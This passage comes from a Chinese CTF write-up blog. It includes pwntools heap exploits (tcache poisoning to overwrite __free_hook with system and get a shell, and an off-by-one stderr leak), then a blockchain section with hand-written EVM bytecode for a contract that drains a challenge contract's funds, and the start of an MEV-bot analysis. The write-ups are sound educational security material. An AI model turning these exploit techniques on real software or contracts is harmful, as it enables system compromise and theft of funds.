class="comment"># 3-9 tcachebin 0x88</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">  free(i+<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>) <span class="comment"># chunk0 -&gt; unsortedbin</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(<span class="number">0xb0</span>)</span><br><span class="line">alloc(<span class="number">1</span>,<span class="number">0x18</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">  alloc(i+<span class="number">3</span>,<span class="number">0xf8</span>,payload) <span class="comment"># 3-9 tcachebin 0xf8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">  free(i+<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">  alloc(i+<span class="number">3</span>,<span class="number">0x80</span>,payload)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">15</span>,<span class="number">0x80</span>,payload)</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">main_arena = u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x60</span></span><br><span class="line">libc_base = main_arena - (libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]+<span class="number">0x10</span>)</span><br><span class="line"><span class="comment"># malloc_hook = libc_base + libc.sym[&#x27;__malloc_hook&#x27;]</span></span><br><span class="line"><span class="comment"># one_gadget = [0x4f2a5, 0x4f302, 0x10a2fc]</span></span><br><span class="line"><span class="comment"># for i in range(len(one_gadget)):</span></span><br><span class="line"><span class="comment">#   one_gadget[i] += libc_base</span></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">sys_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">  free(i+<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">15</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x88</span> + p64(<span class="number">0x21</span>) </span><br><span class="line">alloc(<span class="number">15</span>,<span class="number">0xa0</span>,payload)</span><br><span class="line">free(<span class="number">1</span>) <span class="comment"># put chunk8 into tcachebin</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">  alloc(i+<span class="number">3</span>,<span class="number">0xf0</span>,payload) <span class="comment"># 3-9 0x100 tcachebin</span></span><br><span class="line"></span><br><span class="line">alloc(<span class="number">14</span>,<span class="number">0xf0</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>): <span class="comment"># 3-9 0x100 tcachebin</span></span><br><span class="line">  free(i+<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">  alloc(i+<span class="number">3</span>,<span class="number">0xa0</span>,payload) <span class="comment"># 3-9 0xb0 tcachebin</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>): <span class="comment"># 3-9 0xb0 tcachebin</span></span><br><span class="line">  free(i+<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">15</span>)</span><br><span class="line">free(<span class="number">14</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x88</span> + p64(<span class="number">0x21</span>) + p64(free_hook)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">  alloc(i+<span class="number">3</span>,<span class="number">0xa0</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base   ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;free_hook   ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(free_hook))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;sys_addr   ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(sys_addr))</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">15</span>,<span class="number">0xa0</span>,payload)</span><br><span class="line">payload = <span class="string">&#x27;/bin/sh&#x27;</span></span><br><span class="line">alloc(<span class="number">14</span>,<span class="number">0x18</span>,payload)</span><br><span class="line">payload = p64(sys_addr)</span><br><span class="line">alloc(<span class="number">13</span>,<span class="number">0x18</span>,payload)</span><br><span class="line"></span><br><span class="line">free(<span class="number">14</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">io.interactive(pre=<span class="string">&quot;ls\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x4f2a5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rsp &amp; 0xf == 0</span></span><br><span class="line"><span class="string">  rcx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4f302 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x40] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x10a2fc execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<h1 id="week4">Week4</h1>
<h2 id="pwn-1">Pwn</h2>
<h3 id="eldenring-final">EldenRing Final</h3>
<p>开学一直没时间打，比赛结束了复现一下这道题，只复现到了 leak stderr
的部分，后面的部分就只是 overlap + fastbin 打 malloc_hook</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看结构体</span></span><br><span class="line">p *(struct _IO_FILE*)_IO_2_1_stderr_</span><br></pre></td></tr></table></figure>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">ip = <span class="string">&#x27;139.196.137.203:32320&#x27;</span>.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">file = <span class="string">&#x27;./vuln&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = remote(ip[0],int(ip[1]))</span></span><br><span class="line">io = process(file)</span><br><span class="line"></span><br><span class="line">elf = ELF(file)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">allocPage</span>():</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;&gt;\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"><span class="comment"># 生成两个相连的0x20大小的chunk</span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deletePage</span>(<span class="params">Index</span>):</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;&gt;\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;which page?\n&gt;\n&#x27;</span>, <span class="built_in">str</span>(Index))</span><br><span class="line"><span class="comment"># free 掉第一个0x20大小的chunk</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">allocNote</span>(<span class="params">pageID,size,content</span>):</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;&gt;\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27; attach to?\n&gt;\n&#x27;</span>, <span class="built_in">str</span>(pageID))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;size:\n&gt;\n&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">  io.sendafter(<span class="string">&#x27;content:\n&gt;\n&#x27;</span>, content)  </span><br><span class="line"><span class="comment"># 生成一个size = 0x20的chunk，再生成一个size &lt;= 0x100的chunk，这里有off-by-one</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deleteNote</span>(<span class="params">pageID,noteID</span>):</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;&gt;\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;which page_ID?\n&gt;\n&#x27;</span>, <span class="built_in">str</span>(pageID))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;which note_ID would you like to delete?\n&gt;\n&#x27;</span>, <span class="built_in">str</span>(noteID))</span><br><span class="line"><span class="comment"># 先 free 掉 后生成的chunk，再 free 掉前生成的chunk</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params">is_dbg</span>):</span><br><span class="line">  <span class="keyword">if</span> is_dbg:</span><br><span class="line">    gdb.attach(io,gdbinit)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    gdb.attach(io)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">info</span>(<span class="params">name,value</span>):</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&#x27;&#123;&#125;   ---&gt;   &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(name, <span class="built_in">hex</span>(value)))</span><br><span class="line"></span><br><span class="line">gdbinit = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">  b *0x400B69</span></span><br><span class="line"><span class="string">  b *0x400B6E</span></span><br><span class="line"><span class="string">  c</span></span><br><span class="line"><span class="string">  record</span></span><br><span class="line"><span class="string">  c</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">    io = process(file)</span><br><span class="line">    <span class="comment"># 归并不能write的chunk</span></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line">    allocNote(<span class="number">0</span>,<span class="number">0x20</span>,payload)</span><br><span class="line">    allocNote(<span class="number">0</span>,<span class="number">0x20</span>,payload)</span><br><span class="line">    allocNote(<span class="number">0</span>,<span class="number">0x20</span>,payload)</span><br><span class="line">    allocNote(<span class="number">0</span>,<span class="number">0x20</span>,payload)</span><br><span class="line">    allocNote(<span class="number">0</span>,<span class="number">0x20</span>,payload)</span><br><span class="line">    deleteNote(<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">    deleteNote(<span class="number">0</span>,<span class="number">2</span>)</span><br><span class="line">    deleteNote(<span class="number">0</span>,<span class="number">3</span>)</span><br><span class="line">    deleteNote(<span class="number">0</span>,<span class="number">4</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># off-by-one leak stderr</span></span><br><span class="line">    allocNote(<span class="number">0</span>,<span class="number">0x18</span>,<span class="string">b&#x27;6&#x27;</span>)</span><br><span class="line">    allocNote(<span class="number">0</span>,<span class="number">0xf8</span>,<span class="string">b&#x27;7&#x27;</span>)</span><br><span class="line">    allocNote(<span class="number">0</span>,<span class="number">0x68</span>,<span class="string">b&#x27;8&#x27;</span>)</span><br><span class="line">    allocNote(<span class="number">0</span>,<span class="number">0x68</span>,<span class="string">b&#x27;9&#x27;</span>)</span><br><span class="line">    allocNote(<span class="number">0</span>,<span class="number">0x18</span>,<span class="string">b&#x27;10&#x27;</span>)</span><br><span class="line">    deleteNote(<span class="number">0</span>,<span class="number">6</span>)</span><br><span class="line">    allocNote(<span class="number">0</span>,<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span> + <span class="string">b&#x27;\xe1&#x27;</span>)</span><br><span class="line">    deleteNote(<span class="number">0</span>,<span class="number">7</span>)</span><br><span class="line">    deleteNote(<span class="number">0</span>,<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">    allocNote(<span class="number">0</span>,<span class="number">0xd8</span>,<span class="string">b&#x27;\xd8&#x27;</span>)</span><br><span class="line">    allocNote(<span class="number">0</span>,<span class="number">0x18</span>,<span class="string">b&#x27;\x18&#x27;</span>)</span><br><span class="line">    allocNote(<span class="number">0</span>,<span class="number">0x18</span>,<span class="string">b&#x27;\xdd\x45&#x27;</span>)</span><br><span class="line">    deleteNote(<span class="number">0</span>,<span class="number">13</span>)</span><br><span class="line">    allocNote(<span class="number">0</span>,<span class="number">0x18</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x71&#x27;</span>)</span><br><span class="line">    allocNote(<span class="number">0</span>,<span class="number">0x68</span>,<span class="string">b&#x27;\x68&#x27;</span>)</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x33</span> + p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + <span class="string">b&#x27;\x58&#x27;</span></span><br><span class="line">    dbg(<span class="number">1</span>)</span><br><span class="line">    allocNote(<span class="number">0</span>,<span class="number">0x68</span>,payload)</span><br><span class="line">    libc_base = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>] - <span class="number">0x163</span></span><br><span class="line">    info(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line">  <span class="keyword">except</span>:</span><br><span class="line">    io.close()</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">one_gadget = [<span class="number">0x45206</span>,<span class="number">0x4525a</span>,<span class="number">0xef9f4</span>,<span class="number">0xf0897</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">  one_gadget[i] = libc_base + one_gadget[i]</span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line">  </span><br><span class="line"><span class="comment"># 本题思想：</span></span><br><span class="line">  <span class="comment"># 1. 给结构体申请chunk时，通常会把能write的部分隔离开来，所以我们需要先通过fastbin，把“不能write的部分”放在一起</span></span><br><span class="line">  <span class="comment"># 2. 逆向比较复杂的堆题时，要把每个函数抽象成“对 heap 的操作”，方便理解</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>competition</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>comp - CTF_blockchain_summary</title>
    <url>/posts/34999.html</url>
    <content><![CDATA[<blockquote class="blockquote-center">
CTF 中的 blockchain 题目和常用工具的用法都放在这里面
</blockquote>
<span id="more"></span>
<h1 id="ff-常用工具">[FF] 常用工具</h1>
<h2 id="ff-1-forge">[FF-1] forge</h2>
<h3 id="ff-1-1-动态调试">[FF-1-1] 动态调试</h3>
<p>在安装好forge之后，使用forge init将项目环境初始化成 Foundry
的标准格式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">project/</span><br><span class="line">├── src/             # Solidity 源代码文件</span><br><span class="line">├── test/            # 测试文件</span><br><span class="line">├── lib/             # 外部依赖（如 OpenZeppelin）</span><br><span class="line">└── foundry.toml     # 项目配置文件</span><br></pre></td></tr></table></figure>
<p>在 project/test 中创建文件 xxx.t.sol，在该文件中放入测试用例。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.26;</span><br><span class="line"></span><br><span class="line">import &#123;Test, console&#125; from &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &#123;Attack&#125; from &quot;../src/delegateCall/attack.sol&quot;;</span><br><span class="line">import &#123;DCallVictim&#125; from &quot;../src/delegateCall/DCall.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract DCallTest is Test &#123;</span><br><span class="line">    Attack public attacker;</span><br><span class="line">    DCallVictim public victim;</span><br><span class="line"></span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        victim = new DCallVictim();</span><br><span class="line">        attacker = new Attack(address(victim));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function test_delegate() public &#123;</span><br><span class="line">        attacker.attack();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用下列命令即可调试测试用例。可以通过添加 -vvvv
来增加日志详细程度，也可以添加 --tc xxx.t.sol 来指定测试合约</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">forge test --debug &quot;test_delegate&quot;</span><br></pre></td></tr></table></figure>
<h1 id="sctf">[0] 2024 SCTF</h1>
<h2 id="steal">[0-0] steal</h2>
<p>本题参考了 <a
href="https://blog.wm-team.cn/index.php/archives/82/#steal">W&amp;M 的
wp</a></p>
<h3 id="analysis">[0-0-0] analysis</h3>
<p>这道题当时逆向没逆出来，赛后我才知道可以用gpt-o1反汇编yul核心代码（注意是核心代码，要不然体积太大不好翻译），没
gpt plus 的我只能调教 gpt-4o 了。喂给它的 prompt 是</p>
<p>你现在是一位yul-&gt;solidity的反汇编大师，你很擅长推理，请你帮我反汇编以下代码。另外，我有几点要求：</p>
<ol type="1">
<li><p>不要重复我给你的Yul代码</p></li>
<li><p>如果有些代码需要明确用途，请你直接根据Yul给出对应的solidity代码即可，不能用注释忽略过去</p></li>
</ol>
<p>但是func_0x7f中间的一部分代码还是被忽略了，我框起那部分代码之后再让它<code>请你翻译出这部分的代码，我说过不要用注释</code>之后才得到下面的代码，去掉冗余函数，再稍微人工审计整理一下得到下面核心代码。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Contract &#123;</span><br><span class="line">    function isSolved() internal view returns (bool) &#123;</span><br><span class="line">        uint8 value = uint8(sload(0));</span><br><span class="line">        if (value != 0) &#123;</span><br><span class="line">            if (address(this).balance != 0) &#123;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function steal() internal &#123;</span><br><span class="line">        uint8 flag = uint8(sload(0));</span><br><span class="line">        require(flag == 0);</span><br><span class="line">        bool result = check_contract(msg.sender, 0x24a);</span><br><span class="line">        if (result) &#123;</span><br><span class="line">            (bool success, ) = msg.sender.call&#123;value: address(this).balance&#125;(&quot;&quot;);</span><br><span class="line">            require(success);</span><br><span class="line">            sstore(0, uint256(flag | 1));</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            revert(&quot;Unauthorized&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function check_contract(address _addr, uint256 _val) internal view returns (bool) &#123;</span><br><span class="line">        uint256 size;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            size := extcodesize(_addr)</span><br><span class="line">        &#125;</span><br><span class="line">        if (size == 0 || size &gt; 0x40) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        bytes memory code = new bytes(size);</span><br><span class="line">        assembly &#123;</span><br><span class="line">            extcodecopy(_addr, add(code, 0x20), 0, size)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        uint256 hashToCompare = 0x29df21df2a5f235f;</span><br><span class="line">        for (uint256 i = 0; i &lt; size; i++) &#123;</span><br><span class="line">            bytes32 chunkHash;</span><br><span class="line">            assembly &#123;</span><br><span class="line">                chunkHash := mload(add(code, add(0x20, i)))</span><br><span class="line">            &#125;</span><br><span class="line">            if (chunkHash == bytes32(hashToCompare)) &#123;</span><br><span class="line">                continue;</span><br><span class="line">            &#125;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>想要 isSolved 很简单，只需要成功调用 steal 函数中的 check_contract
函数，我们来看一下 check_contract 函数。</p>
<p>首先，check_contract
函数检查了调用者的合约代码字节数（如果是EOA字节数为0），这个调用者的合约数必须小于40并且不为0；因此作为攻击者，我们首先需要部署攻击合约(下称evil)。</p>
<p>其次，合约中必须存在0x29df21df2a5f235f这八个字节，要达成这个目的比较简单，只需要在编译好的合约bytecode之后附加这个八个字节即可。</p>
<p>在check_contract合约调用成功之后，steal函数会把自己的所有余额转给evil合约，所以evil合约还要实现fallback函数来接受转账。</p>
<h3 id="perform">[0-0-1] perform</h3>
<p>这种搓 mnemonic 的方式用 <a
href="https://www.evm.codes/playground">这个工具</a>
模拟起来比较方便</p>
<h4 id="initialization-code">[0-0-1-0] initialization code</h4>
<p>首先我们需要知道部署合约的本质其实是发送一个没有to参数的tx</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">web3.eth.sendTransaction(&#123;</span><br><span class="line">    from: me</span><br><span class="line">    data: 0x......</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>而 data 由两部分组成，前面的部分是 initialization code，后面紧跟
runtime code</p>
<p>initialization code 主要做的就是将 runtime code
放入内存。我们需要用到<code>CODECOPY(t,f,s)</code>和<code>RETURN(p,s)</code>这两个
opcode，一个通用的模板如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PUSH1 0x??    // (s: runtime code 字节数)</span><br><span class="line">PUSH1 0x??    // (f: initialization code 字节数)</span><br><span class="line">PUSH1 0x00    // (t: 拷贝到内存的t位置(此处为0x00))</span><br><span class="line">CODECOPY</span><br><span class="line">PUSH1 0x??    // (s: 0x??)</span><br><span class="line">PUSH1 0x00    // (p: 0x00)</span><br><span class="line">RETURN        // (返回mem[p,(p+s)]的内容)</span><br></pre></td></tr></table></figure>
<h4 id="runtime-code">[0-0-1-1] runtime code</h4>
<p>首先我们来处理 fallback，runtime code 都是自上而下执行的，我们需要用
jumpi 和 jumpdest 来实现 selector。</p>
<p>而 fallback 逻辑也很简单，只要调用者是 chall 合约直接
<code>stop</code> 就好，但是由于我们需要与 chall
合约地址进行比较，因此我们需要在 storage 里存入 chall 和
我们自己EOA的地址，所以需要修改 initialization code，在 storage[0]
存入我们自己，[1] 存入 chall_address</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CALLER</span><br><span class="line">PUSH1 0x00</span><br><span class="line">SSTORE        // sstore(0,caller()) 等价于 storage[0] = caller; </span><br><span class="line">PUSH20 chall_address</span><br><span class="line">PUSH1 0x00</span><br><span class="line">SSTORE        // storage[1] = chall_address </span><br><span class="line">PUSH1 0x??    // (s: runtime code 字节数)</span><br><span class="line">PUSH1 0x??    // (f: initialization code 字节数)</span><br><span class="line">PUSH1 0x00    // (t: 拷贝到内存的t位置(此处为0x00))</span><br><span class="line">CODECOPY</span><br><span class="line">PUSH1 0x??    // (s: 0x??)</span><br><span class="line">PUSH1 0x00    // (p: 0x00)</span><br><span class="line">RETURN        // (返回mem[p,(p+s)]的内容)</span><br></pre></td></tr></table></figure>
<p>上面是修改后的 initialization code，下面是 runtime code 处理 fallback
的逻辑</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PUSH1 0x00</span><br><span class="line">SLOAD</span><br><span class="line">CALLER</span><br><span class="line">EQ            // if caller == storage[0]，condition == 1</span><br><span class="line">PUSH1 0x??    // dest = 0x??</span><br><span class="line">JUMPI         // if condition == 1, jump to JUMPDEST</span><br><span class="line">STOP          // if condition == 0, execute this line</span><br><span class="line">              // 其实就是 fallback 的处理方法</span><br><span class="line">JUMPDEST      // 下面开始是 me 调用该合约时的处理方式</span><br></pre></td></tr></table></figure>
<p>接下来要调用 steal</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PUSH1 0x00          // outsize</span><br><span class="line">PUSH1 0x00          // out</span><br><span class="line">PUSH1 0x04          // insize (mem[in...(in+size)]作为call的data)</span><br><span class="line">PUSH1 0x00          // in</span><br><span class="line">PUSH1 0x00          // v</span><br><span class="line">PUSH1 0x01          // 调用slot[1]的地址(chall)</span><br><span class="line">SLOAD               // 调用slot[1]的地址(chall)</span><br><span class="line">PUSH2 0xffff        // g</span><br><span class="line">PUSH4 0xcf7a8965    // bytes4(keccak256(&quot;steal()&quot;))</span><br><span class="line">PUSH1 0xe0          // 将0xcf7a8965左移至最高的4bytes</span><br><span class="line">SHL                 // 将0xcf7a8965左移至最高的4bytes</span><br><span class="line">PUSH1 0x00          // 将上一步得到的32bytes存入内存0号</span><br><span class="line">MSTORE</span><br><span class="line">CALL</span><br><span class="line">STOP</span><br></pre></td></tr></table></figure>
<p>把这几段代码拼起来，用上面那个网站转换mnemonic就可以得到bytecode了，但是有一些问题：首先是远程没有PUSH0，PUSH1
0x00 又会耗费很多字节，所以用SELFBALANCE来代替了PUSH1
0x00；其次是我们需要计算上面那些??代表的数值，最后得到的 bytecode
如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CALLER</span><br><span class="line">SELFBALANCE</span><br><span class="line">SSTORE</span><br><span class="line">PUSH20 0x90b978154ee5bf119262a99be39a2f3a5ae81baf</span><br><span class="line">PUSH1 0x01</span><br><span class="line">SSTORE</span><br><span class="line">PUSH1 0x3f</span><br><span class="line">PUSH1 0x25</span><br><span class="line">SELFBALANCE</span><br><span class="line">CODECOPY</span><br><span class="line">PUSH1 0x3f</span><br><span class="line">SELFBALANCE</span><br><span class="line">RETURN</span><br><span class="line">SELFBALANCE</span><br><span class="line">SLOAD</span><br><span class="line">CALLER</span><br><span class="line">EQ</span><br><span class="line">PUSH1 0x08</span><br><span class="line">JUMPI</span><br><span class="line">STOP</span><br><span class="line">JUMPDEST</span><br><span class="line">SELFBALANCE</span><br><span class="line">SELFBALANCE</span><br><span class="line">PUSH1 0x04</span><br><span class="line">SELFBALANCE</span><br><span class="line">SELFBALANCE</span><br><span class="line">PUSH1 0x01</span><br><span class="line">SLOAD</span><br><span class="line">PUSH2 0xffff</span><br><span class="line">PUSH4 0xcf7a8965</span><br><span class="line">PUSH1 0xe0</span><br><span class="line">SHL</span><br><span class="line">SELFBALANCE</span><br><span class="line">MSTORE</span><br><span class="line">CALL</span><br><span class="line">STOP</span><br></pre></td></tr></table></figure>
<p>转换之后得到<code>3347557390b978154ee5bf119262a99be39a2f3a5ae81baf600155603f60254739603f47f347543314600857005b47476004474760015461ffff63cf7a896560e01b4752f100</code>，再拼接上<code>29df21df2a5f235f</code>，直接发送给rpc_url即可</p>
<p>但是我检查了一下发现这个合约的codesize是大于0x40字节的，不知道为什么原作者可以通过，或许是我检查的范围过大了？forge本地也无法直接通过字节码来create，没办法复现了。</p>
<h2 id="staking">[0-1] staking</h2>
<h1 id="wmctf-claim-guard">[1] 2024 WMCTF Claim-Guard</h1>
<h2 id="概述">[1-0] 概述</h2>
<p>这道题的合约很简单，我们只需要 register 后爆破出合适的 pow 就可以成功
proveWork，然后 claimLastWinner
即可。但是问题在于起服务的时候同时起了一个基于 <a
href="https://github.com/tonyke-bot/burberry">burberry</a> 的 MEV
bot，这个 bot 会在我们发起交易时，用更高的 gasPrice
抢先在我们之前执行交易，这样我们就无法通过
<code>require(solveStatus[msg.sender].nonce == type(uint256).max, "already proved");</code>
或者是 <code>require(status.nonce == 0, "not first solver");</code>
这两条检测了。</p>
<p>因此这道题最重要的点就是如何绕过 MEV Bot</p>
<h2 id="分析">[1-1] 分析</h2>
<blockquote>
<p>合约部分比较简单，我就不分析了，直接从 rust 写的 bot 开始分析</p>
</blockquote>
<h3 id="main.rs">[1-1-0] main.rs</h3>
<p>main函数首先监听了 claim-guard 和 burberry 的日志；然后 parse
args，并创建 ws_provider 和 engine；之后通过 <code>add_collector</code>
来监听 newblock 和 pendingTx 这两个事件；再之后收集一些 tx
